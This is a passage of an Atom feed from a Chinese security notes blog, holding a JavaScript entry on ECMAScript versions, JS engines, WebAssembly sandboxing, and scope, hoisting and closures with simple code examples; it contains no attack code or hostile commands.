@@ -1,0 +1,391 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://mobius-0.github.io</id>
+    <title>Khala • Posts by &#34;javascript&#34; tag</title>
+    <link href="https://mobius-0.github.io" />
+    <updated>2022-11-28T01:50:11.000Z</updated>
+    <category term="Hexo" />
+    <category term="shoya" />
+    <category term="网站" />
+    <category term="网络安全" />
+    <category term="工具" />
+    <category term="虚拟机" />
+    <category term="星际争霸2" />
+    <category term="平衡" />
+    <category term="杂谈" />
+    <category term="小说" />
+    <category term="江南" />
+    <category term="龙族" />
+    <category term="动画" />
+    <category term="法律法规" />
+    <category term="域名" />
+    <category term="DNS" />
+    <category term="WEB" />
+    <category term="HTTP" />
+    <category term="计算机网络" />
+    <category term="IPSec" />
+    <category term="VPN" />
+    <category term="SSL" />
+    <category term="TLS" />
+    <category term="WiFi" />
+    <category term="邮件" />
+    <category term="网络协议" />
+    <category term="Linux" />
+    <category term="渗透" />
+    <category term="信息收集" />
+    <category term="痕迹清理" />
+    <category term="Windows" />
+    <category term="ASP" />
+    <category term="CSharp" />
+    <category term="Golang" />
+    <category term="Java" />
+    <category term="语言" />
+    <category term="反序列化" />
+    <category term="混淆" />
+    <category term="沙箱" />
+    <category term="类" />
+    <category term="JDK" />
+    <category term="JavaScript" />
+    <category term="PHP" />
+    <category term="PowerShell" />
+    <category term="Python" />
+    <category term="Ruby" />
+    <category term="Shell" />
+    <category term="漏洞" />
+    <category term="CSRF" />
+    <category term="服务器" />
+    <category term="SQL注入" />
+    <category term="SSRF" />
+    <category term="Cache" />
+    <category term="XSS" />
+    <category term="XXE" />
+    <category term="XML" />
+    <category term="Xpath" />
+    <category term="注入" />
+    <category term="函数" />
+    <category term="绕过" />
+    <category term="遍历" />
+    <category term="包含" />
+    <category term="文件" />
+    <category term="目录" />
+    <category term="读取" />
+    <category term="上传" />
+    <category term="中间件" />
+    <category term="IIS" />
+    <category term="Apache" />
+    <category term="Nginx" />
+    <category term="逻辑" />
+    <category term="策略配置" />
+    <category term="端口" />
+    <category term="社会工程学" />
+    <category term="搜索" />
+    <entry>
+        <id>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/JavaScript/</id>
+        <title>JavaScript</title>
+        <link rel="alternate" href="https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/JavaScript/"/>
+        <content type="html">&lt;h1 id=&#34;ecmascript&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ecmascript&#34;&gt;#&lt;/a&gt; ECMAScript&lt;/h1&gt;
+&lt;h2 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
+&lt;p&gt;ECMAScript 是一种由 ECMA 国际通过 ECMA-262 标准化的脚本程序设计语言，它往往被称为 JavaScript 或 JScript。简单的，可以认为 ECMAScript 是 JavaScript 的一个标准，但实际上后两者是 ECMA-262 标准的实现和扩展。&lt;/p&gt;
+&lt;h2 id=&#34;版本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#版本&#34;&gt;#&lt;/a&gt; 版本&lt;/h2&gt;
+&lt;p&gt;1997 年 6 月，首版发布。1998 年 6 月，进行了格式修正，以使得其形式与 ISO/IEC16262 国际标准一致。1999 年 12 月，引入强大的正则表达式，更好的词法作用域链处理，新的控制指令，异常处理，错误定义更加明确，数据输出的格式化及其它改变。而后由于关于语言的复杂性出现分歧，第 4 版本被放弃，其中的部分成为了第 5 版本及 Harmony 的基础。&lt;/p&gt;
+&lt;p&gt;2009 年 12 月，第五版发布，新增 “严格模式（strict mode）”，澄清了许多第 3 版本的模糊规范，并适应了与规范不一致的真实世界实现的行为。增加了部分新功能，如 getters 及 setters，支持 JSON 以及在对象属性上更完整的反射。&lt;/p&gt;
+&lt;p&gt;2015 年 6 月，第 6 版发布，最早被称作是 ECMAScript 6（ES6），添加了类和模块的语法，迭代器，Python 风格的生成器和生成器表达式，箭头函数，二进制数据，静态类型数组，集合（maps，sets 和 weak maps），promise，reflection 和 proxies。&lt;/p&gt;
+&lt;p&gt;2016 年 6 月，ECMAScript 2016（ES2016）发布，引入  &lt;code&gt;Array.prototype.includes&lt;/code&gt;  、指数运算符、SIMD 等新特性。&lt;/p&gt;
+&lt;p&gt;2017 年 6 月，ECMAScript 2017（ES2017）发布，多个新的概念和语言特性。&lt;/p&gt;
+&lt;p&gt;2018 年 6 月，ECMAScript 2018 （ES2018）发布包含了异步循环，生成器，新的正则表达式特性和 rest/spread 语法。&lt;/p&gt;
+&lt;h2 id=&#34;es6-特性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#es6-特性&#34;&gt;#&lt;/a&gt; ES6 特性&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;const&lt;/code&gt;  /  &lt;code&gt;let&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;模板字面量&lt;/li&gt;
+&lt;li&gt;解构
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;[a, b] = [10, 20]&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;对象字面量简写法&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;for...of&lt;/code&gt;  循环&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;...xxx&lt;/code&gt;  展开运算符&lt;/li&gt;
+&lt;li&gt;可变参数&lt;/li&gt;
+&lt;li&gt;箭头函数&lt;/li&gt;
+&lt;li&gt;默认参数函数&lt;/li&gt;
+&lt;li&gt;默认值与解构&lt;/li&gt;
+&lt;li&gt;类&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;引擎&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#引擎&#34;&gt;#&lt;/a&gt; 引擎&lt;/h1&gt;
+&lt;h2 id=&#34;v8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#v8&#34;&gt;#&lt;/a&gt; V8&lt;/h2&gt;
+&lt;p&gt;V8 是 Chrome 的 JavaScript 语言处理程序（VM）。其引擎由 TurboFan、Ignition 和 Liftoff 组成。其中 Turbofan 是其优化编译器，Ignition 则是其解释器，Liftoff 是 WebAssembly 的代码生成器。&lt;/p&gt;
+&lt;h2 id=&#34;spidermonkey&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spidermonkey&#34;&gt;#&lt;/a&gt; SpiderMonkey&lt;/h2&gt;
+&lt;p&gt;SpiderMonkey 是 Mozilla 项目的一部分，是一个用 C/C++ 实现的 JavaScript 脚本引擎。&lt;/p&gt;
+&lt;h2 id=&#34;javascriptcore&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#javascriptcore&#34;&gt;#&lt;/a&gt; JavaScriptCore&lt;/h2&gt;
+&lt;p&gt;JavaScriptCore 的优化执行分为四个部分，LLInt、Baseline、DFG、FTL。LLInt 是最开始的解释执行部分，Baseline 是暂时的 JIT，DFG 阶段开始做一定的优化，FTL 阶段做了充分的优化。&lt;/p&gt;
+&lt;h2 id=&#34;chakracore&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#chakracore&#34;&gt;#&lt;/a&gt; ChakraCore&lt;/h2&gt;
+&lt;p&gt;ChakraCore 是一个完整的 JavaScript 虚拟机，由微软实现，用于 Edge 浏览器以及 IE 的后期版本中。&lt;/p&gt;
+&lt;h2 id=&#34;jscript&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jscript&#34;&gt;#&lt;/a&gt; JScript&lt;/h2&gt;
+&lt;p&gt;JScript 是由微软开发的脚本语言，是微软对 ECMAScript 规范的实现，用于 IE 的早期版本中。&lt;/p&gt;
+&lt;h2 id=&#34;jerryscript&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jerryscript&#34;&gt;#&lt;/a&gt; JerryScript&lt;/h2&gt;
+&lt;p&gt;JerryScript 是一个适用于嵌入式设备的小型 JavaScript 引擎，由三星开发并维护。&lt;/p&gt;
+&lt;h1 id=&#34;webassembly&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#webassembly&#34;&gt;#&lt;/a&gt; WebAssembly&lt;/h1&gt;
+&lt;h2 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
+&lt;p&gt;简而言之，WASM 是一种分发要在浏览器中执行的代码的新方法。它是一种二进制语言，但是无法直接在处理器上运行。在运行时，代码被编译为中间字节代码，可以在浏览器内快速转换为机器代码，然后比传统 JavaScript 更有效地执行。&lt;/p&gt;
+&lt;h2 id=&#34;执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行&#34;&gt;#&lt;/a&gt; 执行&lt;/h2&gt;
+&lt;p&gt;虽然浏览器可能以不同的方式来实现 Wasm 支持，但是使用的沙盒环境通常是 JavaScript 沙箱。&lt;/p&gt;
+&lt;p&gt;在浏览器中运行时，Wasm 应用程序需要将其代码定义为单独的文件或 JavaScript 块内的字节数组。 然后使用 JavaScript 实例化文件或代码块，目前不能在没有 JavaScript 包装器的情况下直接在页面中调用 Wasm。&lt;/p&gt;
+&lt;p&gt;虽然 Wasm 可以用 C / C++ 等语言编写，但它本身不能与沙箱之外的环境进行交互。这意味着当 Wasm 应用程序想要进行输出文本等操作时，它需要调用浏览器提供的功能，然后使用浏览器在某处输出文本。&lt;/p&gt;
+&lt;p&gt;Wasm 中的内存是线性的，它在 Wasm 应用程序和 JavaScript 之间共享。 当 Wasm 函数将字符串返回给 JavaScript 时，它实际上返回一个指向 Wasm 应用程序内存空间内位置的指针。 Wasm 应用程序本身只能访问分配给它的 JavaScript 内存部分，而不是整个内存空间。&lt;/p&gt;
+&lt;h2 id=&#34;安全&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全&#34;&gt;#&lt;/a&gt; 安全&lt;/h2&gt;
+&lt;p&gt;Wasm 的设计从如下几个方面考虑来保证 Wasm 的安全性&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;保护用户免受由于无意的错误而导致漏洞的应用程序的侵害&lt;/li&gt;
+&lt;li&gt;保护用户免受故意编写为恶意的应用程序的侵害&lt;/li&gt;
+&lt;li&gt;为开发人员提供良好的缓解措施&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;具体的安全措施有&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Wasm 应用程序在沙箱内运行&lt;/li&gt;
+&lt;li&gt;Wasm 无法对任意地址进行函数调用。Wasm 采用对函数进行编号的方式，编号存储在函数表中&lt;/li&gt;
+&lt;li&gt;间接函数调用受类型签名检查的约束&lt;/li&gt;
+&lt;li&gt;调用堆栈受到保护，这意味着无法覆盖返回指针&lt;/li&gt;
+&lt;li&gt;实现了控制流完整性，这意味着调用意外的函数将失败&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;作用域与闭包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域与闭包&#34;&gt;#&lt;/a&gt; 作用域与闭包&lt;/h1&gt;
+&lt;h2 id=&#34;作用域与作用域链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域与作用域链&#34;&gt;#&lt;/a&gt; 作用域与作用域链&lt;/h2&gt;
+&lt;h3 id=&#34;作用域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域&#34;&gt;#&lt;/a&gt; 作用域&lt;/h3&gt;
+&lt;p&gt;简单来说，作用域就是变量与函数的可访问范围，即作用域控制着变量与函数的可见性和生命周期。JavaScript 的作用域是靠函数来形成的，也就是说一个函数的变量在函数外不可以访问。&lt;/p&gt;
+&lt;p&gt;作用域可以分为全局作用域、局部作用域和块级作用域，其中全局作用域主要有以下三种情况：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;函数外面定义的变量拥有全局作用域&lt;/li&gt;
+&lt;li&gt;未定义直接赋值的变量自动声明为拥有全局作用域&lt;/li&gt;
+&lt;li&gt;window 对象的属性拥有全局作用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;局部作用域一般只在固定的代码片段内可访问到，最常见的例如函数内部，所以也会把这种作用域称为函数作用域。&lt;/p&gt;
+&lt;h3 id=&#34;作用域泄漏&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域泄漏&#34;&gt;#&lt;/a&gt; 作用域泄漏&lt;/h3&gt;
+&lt;p&gt;在 ES5 标准时，只有全局作用域和局部作用域，没有块级作用域，这样可能会造成变量泄漏的问题。例如：&lt;/p&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// undefined&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;作用域提升var-hoisting&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域提升var-hoisting&#34;&gt;#&lt;/a&gt; 作用域提升（var Hoisting）&lt;/h3&gt;
+&lt;p&gt;在 JavaScript 中，使用 var 在函数或全局内任何地方声明变量相当于在其内部最顶上声明它，这种行为称为 Hoisting。例如下面这段代码等效于第二段代码&lt;/p&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// =&gt; undefined&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// =&gt; 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// =&gt; undefined&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// =&gt; 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;作用域链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域链&#34;&gt;#&lt;/a&gt; 作用域链&lt;/h3&gt;
+&lt;p&gt;当函数被执行时，总是先从函数内部找寻局部变量，如果找不到相应的变量，则会向创建函数的上级作用域寻找，直到找到全局作用域为止，这个过程被称为作用域链。&lt;/p&gt;
+&lt;h2 id=&#34;闭包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#闭包&#34;&gt;#&lt;/a&gt; 闭包&lt;/h2&gt;
+&lt;p&gt;函数与对其状态即词法环境（lexical environment）的引用共同构成闭包（closure）。也就是说，闭包可以让你从内部函数访问外部函数作用域。在 JavaScript，函数在每次创建时生成闭包。&lt;/p&gt;
+&lt;p&gt;在 JavaScript 中，并没有原生的对 private 方法的支持，即一个元素 / 方法只能被同一个类中的其它方法所调用。而闭包则是一种可以被用于模拟私有方法的方案。另外闭包也提供了管理全局命名空间的能力，避免非核心的方法或属性污染了代码的公共接口部分。下面是一个简单的例子：&lt;/p&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; Counter &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; privateCounter &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;changeBy&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;val&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    privateCounter &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; val&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function-variable function&#34;&gt;increment&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token function&#34;&gt;changeBy&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function-variable function&#34;&gt;decrement&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token function&#34;&gt;changeBy&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 